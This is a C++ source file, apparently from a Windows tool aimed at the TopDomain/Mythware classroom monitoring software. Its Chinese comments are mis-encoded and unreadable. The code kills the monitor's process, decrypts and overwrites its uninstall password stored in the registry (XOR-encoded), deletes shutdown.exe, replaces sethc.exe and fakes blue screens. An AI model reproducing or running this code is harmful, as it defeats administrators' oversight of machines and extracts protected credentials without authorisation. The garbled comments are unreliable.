			LButtonDown = LBnew;//Ȼ���������źŷ��͸�WndProc��֮��Ĵ����ƽ��һ��
			if (LBnew) WndProc(Main.hWnd, WM_LBUTTONDOWN, 0, UT_MESSAGE); else  WndProc(Main.hWnd, WM_LBUTTONUP, 0, UT_MESSAGE);
		}
		break;
	}
	case TIMER_UT3:
	{//�϶�UT"����"ʱ���õļ�ʱ��
		const RECT rcback = UTrc;
		POINT point;
		GetCursorPos(&point);
		UTrc.left = point.x - UTMpoint.x;
		UTrc.top = point.y - UTMpoint.y;
		UTrc.right = point.x - UTMpoint.x + rcback.right - rcback.left;
		UTrc.bottom = point.y - UTMpoint.y + rcback.bottom - rcback.top;
		SetWindowPos(Main.hWnd, 0, UTrc.left, UTrc.top, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
		if (!KEY_DOWN(VK_LBUTTON))KillTimer(Main.hWnd, TIMER_UT3);
		break;
	}
	case TIMER_ONEKEY: {EnumWindows(EnumAllBroadcastwnds, NULL); break; }//"һ����װ"�õļ�ʱ������ʱ���ü�������а�ť
	}
}
bool FirstSD = true;
DWORD WINAPI SDThread(LPVOID pM)//�л�������߳�
{//(��˵)SetThreadDesktopҪ������߳�û�д����κδ��ڣ����������Ҫ����һ���µ��߳�~
	(pM);
	if (FirstSD && FirstFlag)
	{//δ���� -> �����������̨�����ϵ�һ������ -> ��������������explorer
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		myZeroMemory(&si, sizeof(STARTUPINFO));
		myZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(si);
		si.lpDesktop = szVDesk;
		CreateProcess(NULL, ExplorerPath, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		FirstSD = false;
	}
	HDESK vdback;
	if (!NewDesktop)//��ԭʼ�����л���������
		vdback = OpenDesktopW(szVDesk, DF_ALLOWOTHERACCOUNTHOOK, FALSE, GENERIC_ALL);

	else//�л�����
		vdback = OpenDesktopW(L"Default", DF_ALLOWOTHERACCOUNTHOOK, FALSE, GENERIC_ALL);
	NewDesktop = !NewDesktop;
	SetThreadDesktop(vdback);
	SwitchDesktop(vdback);
	return 0;
}
void openfile()//��ʾ"���ļ�"�ĶԻ���
{
	OPENFILENAME ofn;
	wchar_t strFile[MAX_PATH];
	myZeroMemory(&ofn, sizeof(OPENFILENAME));
	myZeroMemory(strFile, sizeof(wchar_t) * MAX_PATH);
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.lpstrFile = (LPWSTR)strFile;
	ofn.nMaxFile = MAX_PATH;
	ofn.Flags = OFN_FILEMUSTEXIST;
	if (GetOpenFileName(&ofn) == TRUE)Main.SetEditStrOrFont(strFile, 0, EDIT_FILEVIEW);
	Main.EditRedraw(EDIT_FILEVIEW);//��������õ�Edit��
}
void BrowseFolder()//��ʾ"���ļ���"�ĶԻ���
{
	wchar_t TempPath[MAX_PATH];
	BROWSEINFO bi;
	myZeroMemory(&bi, sizeof(BROWSEINFO));
	bi.lpszTitle = Main.GetStr(L"OpenFolder");//����
	LPITEMIDLIST pidl = SHBrowseForFolder(&bi);
	if (pidl != 0)
	{
		SHGetPathFromIDList(pidl, TempPath);
		SetCurrentDirectory(TempPath);//����"��ǰ����Ŀ¼"Ϊѡ����ļ��е��ϸ�Ŀ¼
		Main.SetEditStrOrFont(TempPath, 0, EDIT_FILEVIEW);
		Main.EditRedraw(EDIT_FILEVIEW);//��������õ�Edit��
	}
}
void ClearUp()//�����ļ����˳�
{
	ShowWindow(Main.hWnd, SW_HIDE);//�����ش��ڣ�ʹ�����ٶ�"������"���
	if (Admin)if (EnableTADeleter())Main.Check[CHK_T_A_].Value = TRUE;
	DeleteFile(SethcPath);//�ָ�sethc
	CopyFile(L"C:\\SAtemp\\sethc.exe", SethcPath, FALSE);
	AutoDelete(L"C:\\SAtemp\\deletefile.sys", TRUE);
	AutoDelete(TDTempPath, TRUE);//ɾ�����������ļ���
	if (Main.Check[CHK_T_A_].Value)AutoDelete(Name, TRUE);
	MyExitProcess();
}
void ShutdownDeleter()//ɾ�����е�Shutdown.exe
{
	SearchTool(L"C:\\Program Files\\Mythware", 2);
	SearchTool(L"C:\\Program Files\\TopDomain", 2);
	SearchTool(L"C:\\Windows\\System32", 2);//��Ȼ�Ǹ���Ŀ¼Ѱ��
	SearchTool(L"C:\\Program Files (x86)\\Mythware", 2);
	SearchTool(L"C:\\Program Files (x86)\\TopDomain", 2);
	SearchTool(L"C:\\Windows\\SysNative", 2);//SystemĿ¼ɾ��ʱ�����е���
}
DWORD WINAPI ShutdownDeleterThread(LPVOID pM)//����ShutdownDeleter���߳�
{
	(pM);
	Main.EnableButton(BUT_SHUTD, FALSE);
	ShutdownDeleter();
	if (Admin)
	{
		mywcscpy(Main.Button[BUT_SHUTD].Name, Main.GetStr(L"Deleted"));
		Main.ButtonRedraw(BUT_SHUTD);
	}
	else Main.EnableButton(BUT_SHUTD, TRUE);
	return 0;
}
void AutoTerminateTD()//�Զ�����������ӽ���
{
	if (!KillProcess(TDName) && Admin)
		if (EnableKPH())
		{//����ʧ�ܺ�����KPH
			Main.Check[CHK_KPH].Value = TRUE;
			KillProcess(TDName);
		}
}
void ReopenTD()//����֪·��������£����´򿪼�����ӽ���
{
	if (GetFileAttributes(TDPath) != -1)
	{
		if (Main.Check[CHK_TDINVD].Value == 1)
		{
			STARTUPINFO si;
			myZeroMemory(&si, sizeof(STARTUPINFO));
			si.cb = sizeof(si);
			si.lpDesktop = szVDesk;//����Ҫ����������������
			if (!RunEXE(TDPath, NULL, &si))Main.InfoBox(L"StartFail");
		}
		else if (!RunEXE(TDPath, NULL, nullptr))Main.InfoBox(L"StartFail");
	}
}
DWORD WINAPI SizingThread(LPVOID pM)//����Ѱ�Ҳ��򿪼���
{
	(pM);
	if (Main.CurWnd == 5)ShowWindow(FileList, SW_HIDE);
	UTState = true;
	while (1)
	{
		POINT point;
		GetCursorPos(&point);
		RECT rc;
		GetWindowRect(Main.hWnd, &rc);
		point.x -= rc.left; point.y -= rc.top;
		float newDPI = min((float)point.x / (float)Main.Width, (float)point.y / (float)Main.Height);
		if (newDPI < 0.3)newDPI = (float)0.3;
		if (newDPI > 2)newDPI = (float)2;
		if (!KEY_DOWN(VK_LBUTTON))
		{
			UTState = false;
			Main.SetDPI(newDPI);
			SizingLock = false;
			if (Main.CurWnd == 5)
			{
				ShowWindow(FileList, SW_SHOW);
				SetWindowPos(FileList, 0, (int)(180 * Main.DPI), (int)(410 * Main.DPI), (int)(265 * Main.DPI), (int)(120 * Main.DPI), 0);
				::SendMessage(FileList, WM_SETFONT, (WPARAM)Main.DefFont, 1);
			}
			return 0;
		}
		SetWindowPos(Main.hWnd, NULL, 0, 0, (int)(Main.Width * newDPI - 0.5), (int)(Main.Height * newDPI - 0.5), SWP_NOMOVE | SWP_NOREDRAW);
		Main.tdc = GetDC(Main.hWnd);
		SetStretchBltMode(Main.tdc, HALFTONE);
		StretchBlt(Main.tdc, 0, 0, (int)(Main.Width * newDPI - 0.5), (int)(Main.Height * newDPI - 0.5), Main.hdc, 0, 0, (int)(Main.Width * Main.DPI - 0.5), (int)(Main.Height * Main.DPI - 0.5), SRCCOPY);
		ReleaseDC(Main.hWnd, Main.tdc);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI ReopenThread(LPVOID pM)//����Ѱ�Ҳ��򿪼���
{
	(pM);
	if (Main.Button[BUT_RETD].Enabled == FALSE)return 0;
	if (!TDsearched)
	{
		wchar_t tmpstr[MAX_PATH];
		myZeroMemory(tmpstr, sizeof(wchar_t) * MAX_STR);
		TDsearched = TRUE;
		if (!slient)
		{
			mywcscpy(tmpstr, Main.Button[BUT_RETD].Name);
			mywcscpy(Main.Button[BUT_RETD].Name, Main.GetStr(L"starting"));
			Main.EnableButton(BUT_RETD, FALSE);
		}
		//����Ŀ¼����һ�������
		TDSearchDirect();
		if (!slient)
		{
			mywcscpy(Main.Button[BUT_RETD].Name, tmpstr);
			Main.EnableButton(BUT_RETD, TRUE);
		}
		SetTDPathStr();
	}
	ReopenTD();
	if (slient)MyExitProcess();
	return 0;
}

void BSOD(int type)//����αװ����
{//0=auto;1=new;2=old
	LockCursor();//��ס���
	//Ĭ��ʹ��αװ���� + NtShutdown

	if (UTState)noULTRA();//��ֹMain�Ĵ����赲BSOD
	ShowWindow(Main.hWnd, SW_HIDE);

	if (type == 0)
	{
		OSVERSIONINFOEX osvi;
		BOOL bOsVersionInfoEx;
		myZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
		bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);//���һ�ΰ汾�ţ�С��8000��Ӧ��win7����ɵ�ϵͳ
		if (bOsVersionInfoEx && osvi.dwBuildNumber < 8000)Main.Check[CHK_OLDBSOD].Value = TRUE;//��ʱĬ���þɰ�����
	}
	else Main.Check[CHK_OLDBSOD].Value = type - 1;
	Deskwnd = GetDesktopWindow();
	if (FB) { FB = FALSE; MyRegisterClass(hInst, BSODProc, BSODWindow, NULL); }//��ʼ��
	BSODhwnd = CreateWindow(BSODWindow, L"BSOD wnd", WS_POPUP, 0, 0, xLength, yLength, nullptr, nullptr, hInst, nullptr);
	BSODstate = -1;//��������
	SetTimer(BSODhwnd, TIMER_UPDATEBSOD, 16, (TIMERPROC)TimerProc);
	ShowWindow(BSODhwnd, SW_SHOW);

	RestartDirect();//����
}
VOID Restart()//˲������
{
	if (UTState)noULTRA();
	ShowWindow(Main.hWnd, SW_HIDE);
	KillProcess(L"taskmgr.exe");//�رտ��ܸ����Լ���������������
	KillFullScreen();//�ر�ȫ���Ĵ���
	RestartDirect();

	if (FB) { FB = FALSE; MyRegisterClass(hInst, BSODProc, BSODWindow, NULL); }//��ʼ��
	BSODhwnd = CreateWindow(BSODWindow, L"BSOD", WS_POPUP, 0, 0, xLength, yLength, nullptr, nullptr, hInst, nullptr);
	Main.Check[CHK_OLDBSOD].Value = 2;
	ShowWindow(BSODhwnd, SW_SHOW);
	SetTimer(BSODhwnd, TIMER_UPDATEBSOD, 16, (TIMERPROC)TimerProc);
	LockCursor();
}

void AutoChangeChannel(int ChannelID)//�Զ����Ĺ㲥Ƶ��
{
	HKEY hKey;
	LONG ret;
	if (Bit != 64)
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class\\Student", 0, KEY_SET_VALUE, &hKey);
	else
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class\\Student", 0, KEY_SET_VALUE, &hKey);
	if (ret != 0)
	{
		Main.InfoBox(L"ACFail");//�򲻿���ֵ
		RegCloseKey(hKey);
		return;
	}
	ret = RegSetValueEx(hKey, L"ChannelId", 0, REG_DWORD, (const BYTE*)&ChannelID, sizeof(int));
	if (ret != 0)
	{
		Main.InfoBox(L"ACUKE");//���ˣ��������ò��˼�ֵ(һ�㲻������)
		RegCloseKey(hKey);
		return;
	}
	RegCloseKey(hKey);
	Main.InfoBox(L"ACOK");//�ɹ�
	return;
}
void AutoPassBox(const wchar_t* str)
{//�Զ�����õ�������MessageBox��ʾ
	wchar_t TempStr[MAX_STR];
	mywcscpy(TempStr, Main.GetStr(L"pswdis"));
	mywcscat(TempStr, L"\"");
	mywcscat(TempStr, str);
	mywcscat(TempStr, L"\"");
	if (slient || UTState) { Main.InfoBox(TempStr); return; }
	mywcscat(TempStr, Main.GetStr(L"Copypswd"));
	if (MessageBox(Main.hWnd, TempStr, Main.GetStr(L"Info"), MB_ICONINFORMATION | MB_OKCANCEL) == IDOK)
	{
		const int len = mywcslen(str) * 2 + 1;
		HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);
		if (!hHeap)return;
		char* ClipBoardStr = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(char) * len);
		if (ClipBoardStr == 0)return;
		WideCharToMultiByte(CP_ACP, 0, str, -1, ClipBoardStr, len, NULL, NULL);
		if (OpenClipboard(Main.hWnd))
		{
			EmptyClipboard();
			HGLOBAL clipbuffer = GlobalAlloc(GMEM_DDESHARE, strlen(ClipBoardStr) + 1);
			if (!clipbuffer)return;
			char* buffer = (char*)GlobalLock(clipbuffer);
			if (buffer != NULL)strcpy(buffer, LPCSTR(ClipBoardStr));
			GlobalUnlock(clipbuffer);
			SetClipboardData(CF_TEXT, clipbuffer);
			CloseClipboard();
		}
		HeapDestroy(hHeap);
	}
}
void AutoViewPass()//��ȡ���벢��ʾ
{
	HKEY hKey;//��ȡ�ļ��е�handle
	LONG ret;//�Ƿ��ȡ��ֵ�ɹ���״̬
	wchar_t szLocation[MAX_STR];//���ܶ�ȡ���ݵ��ַ���
	DWORD dwSize = sizeof(wchar_t) * MAX_STR;//�ַ����Ĵ�С
	DWORD dwType = REG_SZ;//��ֵ������(�ַ���)
	BYTE* a;
	BOOL error = FALSE;
	BYTE bits[MAX_STR];
	int start, cur = 0;//һЩ��������ʱ����
	DWORD dwType2 = REG_BINARY, dwSize2 = MAX_STR;
	wchar_t str[MAX_STR];
	myZeroMemory(str, sizeof(wchar_t) * MAX_STR);
	myZeroMemory(szLocation, sizeof(wchar_t) * MAX_STR);
#ifndef _WIN64
	myZeroMemory(bits, sizeof(BYTE) * MAX_STR);
#else
	* bits = 0;
#endif
	if (Bit != 64)//���ȳ��Զ�ȡδ���ܹ���(�����������ǰ���Passwd����������)
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_READ, &hKey);
	else//���Դ򿪼�ֵ
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_READ, &hKey);
	if (ret != 0 && slient == FALSE)//�򲻿��ļ���
	{
		if (slient) { error = TRUE; goto finish; }//�����е���ʱֱ�ӽ���
		if (!Main.YesNoBox(L"VPFail"))goto finish;
	}

	ret = RegQueryValueExW(hKey, L"UninstallPasswd", 0, &dwType, (LPBYTE)&szLocation, &dwSize);//���Զ�ȡ��ֵ
	if (ret != 0 && slient == FALSE) goto encrypted;//��ȡ���˼�ֵ�����Ե�knock�ж�ȡ
	if (mywcslen(szLocation) != 0)//��ȡ������������
	{
		if (mywcsstr(szLocation, L"Passwd") != 0)//�����Ǵ�passwd������
		{
			if (mywcsstr(szLocation, L"[123456]") != 0)goto encrypted;//�����к��д������ŵ�123456���ܿ����Ǽ��ܹ���
			if (Bit != 64)//����"Ԥ��ȡ"���ܺ������
				ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class\\Student", 0, KEY_QUERY_VALUE, &hKey);
			else
				ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class\\Student", 0, KEY_QUERY_VALUE, &hKey);
			if (RegQueryValueExW(hKey, L"Knock1", 0, &dwType2, (LPBYTE)bits, &dwSize2) == ERROR_SUCCESS ||
				RegQueryValueExW(hKey, L"Knock", 0, &dwType2, (LPBYTE)bits, &dwSize2) == ERROR_SUCCESS)goto encrypted;

			AutoPassBox(szLocation + 6);//��ʾ��ȡ���
		}
		else AutoPassBox(szLocation);//��ʾ��ȡ���
	}
	else Main.InfoBox(L"VPNULL");
	goto finish;

encrypted:
	if (hKey != 0)RegCloseKey(hKey);
	if (Bit != 64)//Ȼ���Զ�ȡ���ܺ������
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class\\Student", 0, KEY_QUERY_VALUE, &hKey);
	else
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class\\Student", 0, KEY_QUERY_VALUE, &hKey);
	if (ret != 0 && slient == FALSE)//�򲻿��ļ���
	{
		if (slient) { error = TRUE; goto finish; }//�����е���ʱֱ�ӽ���
		if (!Main.YesNoBox(L"VPFail"))goto finish;
	}

	ret = RegQueryValueExW(hKey, L"Knock1", 0, &dwType2, (LPBYTE)bits, &dwSize2);//���Զ�ȡ��ֵ
	if (ret != 0)//��ȡ���˼�ֵ,���Դ�Knock�ж�ȡ	
	{
		ret = RegQueryValueExW(hKey, L"Knock", 0, &dwType2, (LPBYTE)bits, &dwSize2);
		if (ret != 0)goto encrypted2;//���Knock��Knock1�������ڣ���ô���Դ�Key�ж�ȡ
	}
	a = bits;
	while (*a != 0)
	{//��ͷ��β�����ĺ�0x150f0f15���
		*(DWORD*)a ^= 0x150f0f15u;
		a += 4;
	}
	start = bits[0];
	a = bits + start;//��ȡ�����������е�һ���ֽڴ�����Ч���ݵ�λ��

	while ((*a != 0) || (*(a + 1) != 0))
	{//�ѵ����ֽڵ�����ƴ�ӳ��ַ���
		str[cur] = (*(a + 1) << 8) + (*(a));
		a += 2;
		++cur;
	}
	if (mywcslen(str) == 0)Main.InfoBox(L"VPNULL"); else AutoPassBox(str);
	goto finish;

encrypted2:
	if (hKey != 0)RegCloseKey(hKey);
	if (Bit != 64)
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_READ, &hKey);
	else//������2015���������ܣ�������Key��
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_READ, &hKey);
	if (ret != 0 && slient == FALSE)//�򲻿��ļ���
	{
		if (slient) { error = TRUE; goto finish; }//�����е���ʱֱ�ӽ���
		if (!Main.YesNoBox(L"VPFail"))goto finish;
	}

	ret = RegQueryValueExW(hKey, L"Key", 0, &dwType2, (LPBYTE)&bits, &dwSize2);//���Զ�ȡ��ֵ
	if (ret != 0 && slient == FALSE)//�򲻿��ļ���
	{
		if (slient) { error = TRUE; goto finish; }//�����е���ʱֱ�ӽ���
		if (!Main.YesNoBox(L"VPFail"))goto finish;
	}

	for (int i = 0; i < 150; ++i)
	{//��ͷ��β�����ĺ�0x4350u���
		if (bits[i * 2] == 0 && bits[i * 2 + 1] == 0)break;
		bits[i * 2] ^= 0x50;
		bits[i * 2 + 1] ^= 0x43;
	}
	myZeroMemory(str, sizeof(str));
	a = bits;
	while ((*a != 0) || (*(a + 1) != 0))
	{//�ѵ����ֽڵ�����ƴ�ӳ��ַ���
		str[cur] = (*(a + 1) << 8) + (*(a));
		a += 2;
		++cur;
	}
	if (mywcslen(str) == 0)Main.InfoBox(L"VPNULL"); else AutoPassBox(str);
finish:
	if (error)Main.InfoBox(L"VPNULL");
	RegCloseKey(hKey);
	return;
}
void AutoChangePassword(wchar_t* a, int type)//�Զ���������
{
	wchar_t tmp[MAX_STR];
	myZeroMemory(tmp, sizeof(wchar_t) * MAX_STR);
	HKEY hKey; LONG ret; DWORD dwType2 = REG_SZ, dwSize2 = MAX_STR, dwType = REG_BINARY;
	if (Bit != 64)
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
	else//�򿪼�ֵ
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
	if (ret != 0) { Main.InfoBox(L"ACFail"); RegCloseKey(hKey); return; }//��ʧ��
	if (type == 1)
	{
		ret = RegQueryValueExW(hKey, L"UninstallPasswd", 0, &dwType2, (LPBYTE)tmp, &dwSize2);//���Զ�ȡ��ֵ
		if (mywcsstr(tmp, L"Passwd[123456]") != 0 || ret != 0)goto nobasic;
	}
	myZeroMemory(tmp, sizeof(wchar_t) * MAX_STR);
	if (type == 2)mywcscpy(tmp, L"Passwd"), mywcscat(tmp, a);//�Ƿ���֮ǰ����Passwd
	else mywcscpy(tmp, a);
	ret = RegSetValueEx(hKey, L"UninstallPasswd", 0, REG_SZ, (const BYTE*)&tmp, sizeof(wchar_t) * (DWORD)mywcslen(tmp));
	if (ret != 0) { Main.InfoBox(L"ACUKE"); RegCloseKey(hKey); return; }//ʧ��
nobasic:
	RegCloseKey(hKey);
	if (type == 1)//�����޸�key��knock������
	{
		mywcscpy(tmp, L"Passwd");//����˵˵knock����ļ��ܷ�ʽ
		BYTE data[2000];//����2018����IDA�о������ģ��Ժ���ܷ�ʽ���ܻ��
		mywcscat(tmp, a);//������ǣ�����UNICODE���룬ת��Ϊ�����ƺ�
		const int len = (int)mywcslen(tmp) * 2;//�����Ǻ�0x4350u��򣬵õ���ֵǰ8λ����һ��BYTE�����ż��λ��
		for (int i = 0; i < len; ++i)tmp[i] ^= 0x4350u;//��8λ����һ��BYTE���������λ
		for (int i = 0; i < len; ++i)//��ʱ����Ƚ϶̣�����Ŀ�λֱ���������ֵ����
		{//������ʹ������ܶ�ʱ���������ǷǶԳƼ��ܵ����ģ���һ���Ի���(��)
			data[i * 2 + 1] = tmp[i] >> 8;
			data[i * 2] = (BYTE)tmp[i] - (tmp[i] >> 8 << 8);
		}//Ȼ�󣬾�û�ˡ�ֻ��һ�������ѣ�ǿ�Ȳ�����
		if (Bit != 64)
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
		else//������2015���������ܣ�������Key��
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-learning Class Standard\\1.00", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);

		ret = RegQueryValueExW(hKey, L"Key", 0, &dwType, (LPBYTE)tmp, &dwSize2);//���Զ�ȡ��ֵ
		if (ret != 0)goto nokey;
		RegSetValueEx(hKey, L"Key", 0, REG_BINARY, (const BYTE*)data, sizeof(char) * len);
	nokey:
		if (Bit != 64)change(a, FALSE); else change(a, TRUE);//������2016��������ܣ�������Knock��
	}
	Main.InfoBox(L"ACOK");
	return;
}

void AutoCreateCatchWnd()
{
	if (FC)MyRegisterClass(hInst, CatchProc, CatchWindow, FALSE), FC = FALSE;//ע����
	if (CatchWnd != 0)
	{
		if (!IsWindowVisible(CatchWnd))ShowWindow(CatchWnd, SW_SHOW);
		return;
	}
	CatchWnd = CreateWindowW(CatchWindow, Main.GetStr(L"Title2"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 600, 500, nullptr, nullptr, hInst, nullptr);
	ShowWindow(CatchWnd, SW_SHOW);
	return;
}

BOOL RunCmdLine(LPWSTR str)//��������ʱ�������в�ִ��
{
	BOOL console; DWORD pid;
	mywcslwr(str);//ȫ��ת��ΪСд��ĸ
	for (unsigned int i = 0; i < mywcslen(str); ++i)if (str[i] == L'/')str[i] = L'-';
	if (GetSystemDefaultLangID() == 0x0409)//Ӣ��ϵͳ���Զ��л�����
	{
		wchar_t Tempstr[MAX_STR];
		ReleaseLanguageFiles(TDTempPath, 2, Tempstr);
		SwitchLanguage(Tempstr);
	}

	if (mywcsstr(str, L"-top") != NULL)//��ʾ�ڰ�ȫ��������
	{
		Main.Check[CHK_TOP].Value = 1;
		TOP = TRUE;
		CreateThread(NULL, 0, TopThread, NULL, 0, NULL);
		goto noreturn;//FALSE��ʾ��������
	}
	pid = GetParentProcessID(GetCurrentProcessId());
	console = AttachConsole(pid);//���ӵ���������������
	hdlWrite = GetStdHandle(STD_OUTPUT_HANDLE);

	slient = TRUE;
	if (mywcsstr(str, L"-help") != NULL || mywcsstr(str, L"-?") != NULL)//��ʾ����
	{
		wchar_t HelpPath[MAX_PATH];
		mywcscpy(HelpPath, TDTempPath);
		mywcscat(HelpPath, L"help.txt");
		ReleaseRes(HelpPath, FILE_HELP, L"JPG");
		DWORD NumberOfBytesRead;

		HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);
		if (!hHeap)goto error;
		wchar_t* AllTmp = (wchar_t*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(wchar_t) * MAX_LANGUAGE_LENGTH), * Pointer1, * Pointer2;
		char* ANSItmp = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(char) * MAX_LANGUAGE_LENGTH);
		if (AllTmp == 0 || ANSItmp == 0)goto error;
		HANDLE hf = CreateFile(HelpPath, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		if (hf == 0)goto okreturn;
		if (!ReadFile(hf, ANSItmp, MAX_LANGUAGE_LENGTH, &NumberOfBytesRead, NULL))goto error;
		MultiByteToWideChar(CP_ACP, 0, ANSItmp, -1, AllTmp, MAX_LANGUAGE_LENGTH);
		Pointer1 = AllTmp;
		if (NumberOfBytesRead == 0)goto okreturn;
		for (int i = 1; i < HELP_END; ++i)
		{
			Pointer2 = mywcsstr(Pointer1, L"\n");
			if (Pointer2 == 0)break;
			Pointer2[0] = 0;
			if (i >= HELP_START)Main.InfoBox(Pointer1);
			Pointer1 = Pointer2 + 1;
		}
		CloseHandle(hf);
		HeapDestroy(hHeap);
		goto okreturn;
	}
	if (mywcsstr(str, L"-sethc") != NULL)//��װsethc
	{
		if (!DeleteSethc()) { Main.InfoBox(L"DSR3Fail"); goto okreturn; }
		AutoSetupSethc();
		goto okreturn;
	}
	if (mywcsstr(str, L"-enablebut") != NULL) { SetTimer(0, TIMER_ONEKEY, 1500, (TIMERPROC)TimerProc); Main.InfoBox(L"suc"); goto noreturn; }//һ����װ(EnableButton)
	if (mywcsstr(str, L"-killtop") != NULL) { if (KillFullScreen()) Main.InfoBox(L"suc"); goto okreturn; } //�Զ������ö�����
	if (mywcsstr(str, L"-unsethc") != NULL) { UninstallSethc(); goto okreturn; }//ж��sethc
	if (mywcsstr(str, L"-vp") != NULL) { AutoViewPass(); goto okreturn; }//��ʾ����
	if (mywcsstr(str, L"-antishutdown") != NULL) { ShutdownDeleter(); Main.InfoBox(L"suc");  goto okreturn; }//ɾ��shutdown
	if (mywcsstr(str, L"-retd") != NULL) { TDSearchDirect(); ReopenTD(); if (TDPath[0] != 0) Main.InfoBox(L"suc"); goto okreturn; }
	if (mywcsstr(str, L"-bsod") != NULL)
	{
		if (mywcscmp(str, L"old") != 0) { BSOD(2); goto noreturn; }
		if (mywcscmp(str, L"new") != 0) { BSOD(1); goto noreturn; }
		BSOD(0); goto noreturn;
	}
	if (mywcsstr(str, L"-reboot") != NULL) { Restart(); goto okreturn; }
	if (mywcsstr(str, L"-clear") != NULL)
	{
		wchar_t tmp[MAX_STR];
		myZeroMemory(tmp, sizeof(wchar_t) * MAX_STR);
		AutoChangePassword(tmp, 1);
		goto okreturn;
	}
	if (mywcsstr(str, L"-rekill") != NULL)
	{
		wchar_t tmp[MAX_PATH], * tmp1 = mywcsstr(str, L"-rekill");
		if (!Findquotations(tmp1, tmp))goto error;
		while (1) { if (KillProcess(tmp))Main.InfoBox(L"suc"); else error();  Sleep(500); }
	}
	if (mywcsstr(str, L"-del") != NULL)
	{
		wchar_t tmp[MAX_PATH], * tmp1 = mywcsstr(str, L"-del");
		myZeroMemory(tmp, sizeof(wchar_t) * MAX_PATH);
		if (!Findquotations(tmp1, tmp))goto error;
		AutoDelete(tmp, TRUE);
		goto okreturn;
	}
	if (mywcsstr(str, L"-changepasswd") != NULL)//ǰ�����˳���ܵ���
	{//��Ϊchangepasswd����change����ַ���
		wchar_t tmp[MAX_PATH], * tmp1 = mywcsstr(str, L"-changewithpasswd");
		myZeroMemory(tmp, sizeof(wchar_t) * MAX_PATH);
		if (!Findquotations(tmp1, tmp))goto error;
		AutoChangePassword(tmp, 2);
		goto okreturn;
	}
	if (mywcsstr(str, L"-channel") != NULL)
	{
		wchar_t tmp[MAX_PATH], * tmp1 = mywcsstr(str, L"-channel");
		myZeroMemory(tmp, sizeof(wchar_t) * MAX_PATH);
		if (!Findquotations(tmp1, tmp))goto error;
		AutoChangeChannel(mywtoi(tmp));
		goto okreturn;
	}
	if (mywcsstr(str, L"-change") != NULL)
	{
		wchar_t tmp[MAX_PATH], * tmp1 = mywcsstr(str, L"-change");
		myZeroMemory(tmp, sizeof(wchar_t) * MAX_PATH);
		if (!Findquotations(tmp1, tmp))goto error;
		AutoChangePassword(tmp, 1);
		goto okreturn;
	}
error:
	SetConsoleTextAttribute(hdlWrite, FOREGROUND_RED | FOREGROUND_INTENSITY);
	Main.InfoBox(L"unkcmd");//����ʱʹ�ú�ɫ����
	SetConsoleTextAttribute(hdlWrite, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
okreturn:
	if (!console)return TRUE;
	FreeConsole();//�ڽ���ǰģ��һ�»س�������
	keybd_event(13, 0, 0, 0);
	keybd_event(13, 0, KEYEVENTF_KEYUP, 0);
	return TRUE;
noreturn:
	return FALSE;
}

#ifdef _DEBUG
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
#else
int main()//������ڵ�
#endif
{//�ͳ�������޹صĳ�ʼ��
#ifdef _DEBUG
	(hPrevInstance); (nCmdShow);
#endif

	GetPath();//��ȡ����Ŀ¼
	Admin = IsUserAnAdmin();//�Ƿ����Ա
	FirstFlag = (GetFileAttributes(TDTempPath) == -1);

	wchar_t CmdLine[MAX_PATH];
